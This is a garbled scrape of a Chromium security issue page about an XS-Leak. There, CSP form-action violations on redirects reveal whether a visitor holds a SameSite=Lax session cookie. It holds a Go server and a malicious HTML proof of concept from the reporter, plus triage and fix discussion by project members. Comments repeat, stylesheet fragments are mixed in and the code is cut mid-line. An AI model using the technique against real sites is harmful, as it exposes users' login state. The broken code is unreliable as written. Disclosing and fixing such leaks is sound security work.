        Thanks for the report. If I understand correctly, there are a few things that we could do to help here:<span class="line"><!---->Thanks for the report. If I understand correctly, there are a few things that we could do to help here:<!----></span><br>1) Stop checking CSP form-action on redirects (as Firefox and Safari do, IIUC)<span class="line"><!---->1) Stop checking CSP form-action on redirects (as Firefox and Safari do, IIUC)<!----></span><br>2) Avoid reporting CSP violations in case of redirects.<span class="line"><!---->2) Avoid reporting CSP violations in case of redirects.<!----></span><br>3) Drop LAX cookies from form requests.<span class="line"><!---->3) Drop LAX cookies from form requests.<!----></span><br><br>Would you agree?<span class="line"><!---->Would you agree?<!----></span><br><br>3) is unlikely to happen in the short term.<span class="line"><!---->3) is unlikely to happen in the short term.<!----></span><br>1) is something we could do, I believe.<span class="line"><!---->1) is something we could do, I believe.<!----></span><br>2) seems like a general solution to prevent XS leaks which I believe we should explore.<span class="line"><!---->2) seems like a general solution to prevent XS leaks which I believe we should explore.<!----></span><br><br>If I understand correctly, the same bug would apply to CSP navigate-to as currently specified (if we were to ship it).<span class="line"><!---->If I understand correctly, the same bug would apply to CSP navigate-to as currently specified (if we were to ship it).<!----></span><mr-comment-content></mr-comment-content>

        Probably the 1) option is the best one. One could still bypass the form-action directive with open redirect found in whitelisted domains, but this still needs to chain multiple vulnerabilities, and the impact isn't too bad anyway.         https://bughunters.google.com/about/rules/5745167867576320<a class="undefined" target="_blank" href="https://bughunters.google.com/about/rules/5745167867576320"><!---->https://bughunters.google.com/about/rules/5745167867576320<!----></a><br>Bugs disclosed publicly or to a third-party for purposes other than fixing the bug will typically not qualify for a reward.           Comment 34<a class="comment-link" href="?id=1259077#c34">Comment 34<!----></a>

          
        by
        
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>

      anton...@chromium.org<span id="user-text" hidden=""><!---->anton...@chromium.org<!----></span>

    <chops-timestamp title="Wed, Jul 13, 2022, 8:33 AM EDT"></chops-timestamp>
        
          Project Member<span class="role-label">Project Member</span>
      
        <div>
          <a class="comment-link" href="?id=1259077#c34">Comment 34<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Jul 13, 2022, 8:33 AM EDT"></chops-timestamp>
        
          <span class="role-label">Project Member</span>
      
        </div>
        
      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1259077#c34">Comment 34<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Jul 13, 2022, 8:33 AM EDT"></chops-timestamp>
        
          <span class="role-label">Project Member</span>
      
        </div>
        
      </div>
    
      
        
      
        
          Status:<strong><!---->Status:</strong>
          
          ExternalDependency
          (was: Assigned)
          <br>
        
        
      <div class="issue-diff">
        <!---->
          <strong><!---->Status:</strong>
          
          ExternalDependency
          (was: Assigned)
          <br>
        <!---->
        
      </div><br>
    
        
      
        Basically, this bug must be weighted against the benefit of the CSP form-action directive, which allows to block exfiltrations via forms. Either we drop CSP form-action in its current form, or we decide that websites being able to learn whether a navigation they initiate redirects or not (and where) is fine.<span class="line"><!---->Basically, this bug must be weighted against the benefit of the CSP form-action directive, which allows to block exfiltrations via forms. Either we drop CSP form-action in its current form, or we decide that websites being able to learn whether a navigation they initiate redirects or not (and where) is fine.<!----></span><br><br>I will mark this as ExternalDependency, since we are unlikely to do anything until there is an agreement with the W3C on this.<span class="line"><!---->I will mark this as ExternalDependency, since we are unlikely to do anything until there is an agreement with the W3C on this.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>
    
      
    <mr-comment headinglevel="2" commenterismember=""></mr-comment>

          Comment 44<a class="comment-link" href="?id=1259077#c44">Comment 44<!----></a>

          
        by

        }

        }

        }
      </style>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        for LitElement.

      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;

        }

        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;

          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;

            width: 100%;
            padding: 0;
            border: 0;
          }

 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });

    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }

    background: none;

          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>
      
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

        <div class="dialog-content">
          <slot></slot>
        </div>

          Issue tracker keyboard shortcuts

          </button>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>
      
          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br><br>Chromium's design decision to block redirects on CSP's form-action directive somewhat undermines the benefits of SameSite=Lax. A third-party site can indeed detect the occurence of a cross-origin (server-side) redirect, even if this redirect requires, in order to occur, the presence of some SameSite=Lax cookie in the initial request.<span class="line"><!---->Chromium's design decision to block redirects on CSP's form-action directive somewhat undermines the benefits of SameSite=Lax. A third-party site can indeed detect the occurence of a cross-origin (server-side) redirect, even if this redirect requires, in order to occur, the presence of some SameSite=Lax cookie in the initial request.<!----></span><br><br>I've documented this technique on<span class="line"><!---->I've documented this technique on<!----></span> <span class="line"><!----> <!----></span>xsleaks.dev<a class="undefined" target="_blank" href="https://xsleaks.dev"><!---->xsleaks.dev<!----></a> (see <span class="line"><!----> (see <!----></span>https://xsleaks.dev/docs/attacks/navigations/#csp-violations<a class="undefined" target="_blank" href="https://xsleaks.dev/docs/attacks/navigations/#csp-violations"><!---->https://xsleaks.dev/docs/attacks/navigations/#csp-violations<!----></a>)<span class="line"><!---->)<!----></span> and I've leveraged it in a privacy attack against Slack users (see <span class="line"><!----> and I've leveraged it in a privacy attack against Slack users (see <!----></span>https://jub0bs.com/posts/2021-10-12-xsleak-stack/<a class="undefined" target="_blank" href="https://jub0bs.com/posts/2021-10-12-xsleak-stack/"><!---->https://jub0bs.com/posts/2021-10-12-xsleak-stack/<!----></a>).<span class="line"><!---->).<!----></span><br><br>As pointed out by Egor Homakov in an older issue (#313737), this behaviour can prove problematic, e.g. for OAuth.<span class="line"><!---->As pointed out by Egor Homakov in an older issue (#313737), this behaviour can prove problematic, e.g. for OAuth.<!----></span><br><br>---<span class="line"><!---->---<!----></span><br><br>Whether CSP's form-action should block redirects after a form submission is a matter of dispute; even the W3C hasn't made up its collective mind and<span class="line"><!---->Whether CSP's form-action should block redirects after a form submission is a matter of dispute; even the W3C hasn't made up its collective mind and<!----></span><br>the directive's behaviour in the face of redirects remains unspecified.<span class="line"><!---->the directive's behaviour in the face of redirects remains unspecified.<!----></span><br><br>The conversation in the relevant GitHub issue (<span class="line"><!---->The conversation in the relevant GitHub issue (<!----></span>https://github.com/w3c/webappsec-csp/issues/8<a class="undefined" target="_blank" href="https://github.com/w3c/webappsec-csp/issues/8"><!---->https://github.com/w3c/webappsec-csp/issues/8<!----></a>)<span class="line"><!---->)<!----></span> has so far revolved around the risk of form-data exfiltration and the tradeoff between strictness and usability, but the possibility of an attacker abusing form-action to effect an XSLeak appears to have been overlooked.<span class="line"><!----> has so far revolved around the risk of form-data exfiltration and the tradeoff between strictness and usability, but the possibility of an attacker abusing form-action to effect an XSLeak appears to have been overlooked.<!----></span><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br><br>Chrome Version: 97.0.4666.2 (Official Build) canary (x86_64)<span class="line"><!---->Chrome Version: 97.0.4666.2 (Official Build) canary (x86_64)<!----></span><br>Operating System: macOS Big Sur 11.5.2<span class="line"><!---->Operating System: macOS Big Sur 11.5.2<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br><br>Assume that the following Go server is bound to localhost:8081:<span class="line"><!---->Assume that the following Go server is bound to localhost:8081:<!----></span><br><br>```go<span class="line"><!---->```go<!----></span><br>package main<span class="line"><!---->package main<!----></span><br><br>import (<span class="line"><!---->import (<!----></span><br>  "io"<span class="line"><!---->  "io"<!----></span><br>  "log"<span class="line"><!---->  "log"<!----></span><br>  "net/http"<span class="line"><!---->  "net/http"<!----></span><br>  "time"<span class="line"><!---->  "time"<!----></span><br>)<span class="line"><!---->)<!----></span><br><br>const (<span class="line"><!---->const (<!----></span><br>  cookieName  = "session"<span class="line"><!---->  cookieName  = "session"<!----></span><br>  contentType = "Content-Type"<span class="line"><!---->  contentType = "Content-Type"<!----></span><br>  plainText   = "text/plain"<span class="line"><!---->  plainText   = "text/plain"<!----></span><br>)<span class="line"><!---->)<!----></span><br><br>func main() {<span class="line"><!---->func main() {<!----></span><br>  http.HandleFunc("/set", setCookie)<span class="line"><!---->  http.HandleFunc("/set", setCookie)<!----></span><br>  http.HandleFunc("/clear", clearCookie)<span class="line"><!---->  http.HandleFunc("/clear", clearCookie)<!----></span><br>  http.HandleFunc("/maybe-redirect", maybeRedirect)<span class="line"><!---->  http.HandleFunc("/maybe-redirect", maybeRedirect)<!----></span><br>  if err := http.ListenAndServe(":8081", nil); err != nil {<span class="line"><!---->  if err := http.ListenAndServe(":8081", nil); err != nil {<!----></span><br>    log.Fatal(err)<span class="line"><!---->    log.Fatal(err)<!----></span><br>  }<span class="line"><!---->  }<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>func setCookie(w http.ResponseWriter, r *http.Request) {<span class="line"><!---->func setCookie(w http.ResponseWriter, r *http.Request) {<!----></span><br>  w.Header().Set(contentType, plainText)<span class="line"><!---->  w.Header().Set(contentType, plainText)<!----></span><br>  cookie := http.Cookie{<span class="line"><!---->  cookie := http.Cookie{<!----></span><br>    Name:     cookieName,<span class="line"><!---->    Name:     cookieName,<!----></span><br>    Value:    "whatever",<span class="line"><!---->    Value:    "whatever",<!----></span><br>    Path:     "/",<span class="line"><!---->    Path:     "/",<!----></span><br>    Secure:   true,<span class="line"><!---->    Secure:   true,<!----></span><br>    HttpOnly: true,<span class="line"><!---->    HttpOnly: true,<!----></span><br>    SameSite: http.SameSiteLaxMode,<span class="line"><!---->    SameSite: http.SameSiteLaxMode,<!----></span><br>  }<span class="line"><!---->  io.WriteString(w, "SameSite=Lax cookie set!")<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>func clearCookie(w http.ResponseWriter, r *http.Request) {<span class="line"><!---->func clearCookie(w http.ResponseWriter, r *http.Request) {<!----></span><br>  w.Header().Set(contentType, plainText)<span class="line"><!---->  w.Header().Set(contentType, plainText)<!----></span><br>  // clear cookie<span class="line"><!---->  // clear cookie<!----></span><br>  cookie := http.Cookie{<span class="line"><!---->  cookie := http.Cookie{<!----></span><br> class="line"><!---->  io.WriteString(w, "Cookie cleared.")<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>func maybeRedirect(w http.ResponseWriter, r *http.Request) {<span class="line"><!---->func maybeRedirect(w http.ResponseWriter, r *http.Request) {<!----></span><br>  w.Header().Set(contentType, plainText)<span class="line"><!---->  w.Header().Set(contentType, plainText)<!----></span><br>  for _, c := range r.Cookies() {<span class="line"><!---->  for _, c := range r.Cookies() {<!----></span><br>    if c.Name == cookieName {<span class="line"><!---->    if c.Name == cookieName {<!----></span><br>      const redirectPath = "<span class="line"><!---->      const redirectPath = "<!----></span>https://twitter.com/jub0bs<a class="undefined" target="_blank" href="https://twitter.com/jub0bs"><!---->https://twitter.com/jub0bs<!----></a>"<span class="line"><!---->"<!----></span><br>      http.Redirect(w, r, redirectPath, http.StatusFound)<span class="line"><!---->      http.Redirect(w, r, redirectPath, http.StatusFound)<!----></span><br>      return<span class="line"><!---->      return<!----></span><br>    }<span class="line"><!----> redirect...")<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>The /maybe-redirect endpoint results in a cross-site redirect (to my Twitter profile, for this example) only if a SameSite=Lax cookie named "session" is attached to the request.<span class="line"><!---->The /maybe-redirect endpoint results in a cross-site redirect (to my Twitter profile, for this example) only if a SameSite=Lax cookie named "session" is attached to the request.<!----></span><br><br>If the victim visits the malicious page below and has the required cookie on localhost:8081, the redirect occurs, which triggers a CSP violation and "notifies" the attacker.<span class="line"><!---->If the victim visits the malicious page below and has the required cookie on localhost:8081, the redirect occurs, which triggers a CSP violation and "notifies" the attacker.<!----></span><br><br>```html<span class="line"><!---->```html<!----></span><br><!doctype &lt;/form&gt;<!----></span><br>    <script><span class="line"><!---->    &lt;script&gt;<!----></span><br>      window.addEventListener('securitypolicyviolation', () => {<span class="line"><!---->      window.addEventListener('securitypolicyviolation', () =&gt; {<!----></span><br>          alert("User is logged in!")<span class="line"><!---->          alert("User is logged in!")<!----></span><br>        });<span class="line"><!---->        });<!----></span><br>      myForm.submit();<span class="line"><!---->      myForm.submit();<!----></span><br>    </script><span class="line"><!---->         Thanks for your report! My understanding of this report is that this is a small proof-of-concept that replicates the same attack that your blog post describes against Slack -- is that correct?<span class="line"><!---->Thanks for your report! My understanding of this report is that this is a small proof-of-concept that replicates the same attack that your blog post describes against Slack -- is that correct?<!----></span><br><br>Tentatively setting this as Severity-Medium (treating an XSLeak as a partial/mitigated bypass of the same-origin policy) and FoundIn-94 as I can repro on Stable. I think this likely affects all Blink platforms.<span class="line"><!---->Tentatively setting this as Severity-Medium (treating an XSLeak as a partial/mitigated bypass of the same-origin policy) and FoundIn-94 as I can repro on Stable.         My exact repro steps were:<span class="line"><!---->My exact repro steps were:<!----></span><br><br>0. Download both files into one directory and cd into it<span class="line"><!---->0. Download both files into one directory and cd into it<!----></span><br>1. Start the server with `go run server.go`<span class="line"><!---->1. Start the server with `go run server.go`<!----></span><br>2. Visit localhost:8081/set to set the cookie<span class="line"><!---->2. Visit localhost:8081/set to set the cookie<!----></span><br>3. In a second tab, load malicious.html from file (dragging and dropping)<span class="line"><!---->3. In a second tab, load malicious.html from file (dragging and dropping)<!----></span><br>4. See that securitypolicyviolation listener fires and the alert is shown<span class="line"><!---->4. See that securitypolicyviolation listener fires and the alert is shown<!----></span><mr-comment-content></mr-comment-content>

      </div>
    
      
        
        
      
        Thanks for the report. If I understand correctly, there are a few things that we could do to help here:<span class="line"><!---->Thanks for the report. If I understand correctly, there are a few things that we could do to help here:<!----></span><br>1) Stop checking CSP form-action on redirects (as Firefox and Safari do, IIUC)<span class="line"><!---->1) Stop checking CSP form-action on redirects (as Firefox and Safari do, IIUC)<!----></span><br>2) Avoid reporting CSP violations in case of redirects.<span class="line"><!---->2) Avoid reporting CSP violations in case of redirects.<!----></span><br>3) Drop LAX cookies from form requests.<span class="line"><!---->3) Drop LAX cookies from form requests.<!----></span><br><br>Would you agree?<span class="line"><!---->Would you agree?<!----></span><br><br>3) is unlikely to happen in the short term.<span class="line"><!---->3) is unlikely to happen in the short term.<!----></span><br>1) is something we could do, I believe.<span class="line"><!---->1) is something we could do, I believe.<!----></span><br>2) seems like a general solution to prevent XS leaks which I believe we should explore.<span class="line"><!---->2) seems like a general solution to prevent XS leaks which I believe we should explore.<!----></span><br><br>If I understand correctly, the same bug would apply to CSP navigate-to as currently specified (if we were to ship it).<span class="line"><!---->If I understand correctly, the same bug would apply to CSP navigate-to as currently specified (if we were to ship it).<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        Probably the 1) option is the best one. One could still bypass the form-action directive with open redirect found in whitelisted domains, but this still needs to chain multiple vulnerabilities, and the impact isn't too bad anyway. Same would apply for navigate-to directive.<span class="line"><!---->Probably the 1) option is the best one. One could still bypass the form-action directive with open redirect found in whitelisted domains, but this still needs to chain multiple vulnerabilities, and the impact isn't too bad anyway.         Referring to <span class="line"><!---->Referring to <!----></span>comment#5<a class="undefined" target="_blank" href="#c5"><!---->comment#5<!----></a>. Given the discussion on <span class="line"><!---->. Given the discussion on <!----></span>https://github.com/w3c/webappsec-csp/issues/517<a class="undefined" target="_blank" href="https://github.com/w3c/webappsec-csp/issues/517"><!---->https://github.com/w3c/webappsec-csp/issues/517<!----></a>,<span class="line"><!---->,<!----></span> option 2) does not really make sense.<span class="line"><!----> option 2) does not really make sense.<!----></span><br><br>I still believe we should implement 1). This is a behavioural change, though. Moreover, the discussion around form-action and redirects has been going on for a long time (<span class="line"><!---->I still believe we should implement 1). This is a behavioural change, though. Moreover, the discussion around form-action and redirects has been going on for a long time (<!----></span>https://github.com/w3c/webappsec-csp/issues/8<a class="undefined" target="_blank" href="https://github.com/w3c/webappsec-csp/issues/8"><!---->https://github.com/w3c/webappsec-csp/issues/8<!----></a>)<span class="line"><!---->)<!----></span> and it does not seem to me like there is an agreement yet. Pushing this forward will require some time.<span class="line"><!----> and it does not seem to me like there is an agreement yet. Pushing this forward will require some time.<!----></span><mr-comment-content></mr-comment-content>

        by

        <div>
          <a class="comment-link" href="?id=1259077#c34">Comment 34<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Jul 13, 2022, 8:33 AM EDT"></chops-timestamp>

      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1259077#c34">Comment 34<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Jul 13, 2022, 8:33 AM EDT"></chops-timestamp>
        
          <span class="role-label">Project Member</span>
      
        </div>
        
      </div>
    
      
        
      
        
          Status:<strong><!---->Status:</strong>
          
          ExternalDependency
          (was: Assigned)
          <br>
        
        
      <div class="issue-diff">
        <!---->
          <strong><!---->Status:</strong>
          
          ExternalDependency
          (was: Assigned)
          <br>
        <!---->
        
      </div><br>
    
        
      
        Basically, this bug must be weighted against the benefit of the CSP form-action directive, which allows to block exfiltrations via forms. Either we drop CSP form-action in its current form, or we decide that websites being able to learn whether a navigation they initiate redirects or not (and where) is fine.<span class="line"><!---->Basically, this bug must be weighted against the benefit of the CSP form-action directive, which allows to block exfiltrations via forms. Either we drop CSP form-action in its current form, or we decide that websites being able to learn whether a navigation they initiate redirects or not (and where) is fine.<!----></span><br><br>I will mark this as ExternalDependency, since we are unlikely to do anything until there is an agreement with the W3C on this.<span class="line"><!---->I will mark this as ExternalDependency, since we are unlikely to do anything until there is an agreement with the W3C on this.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
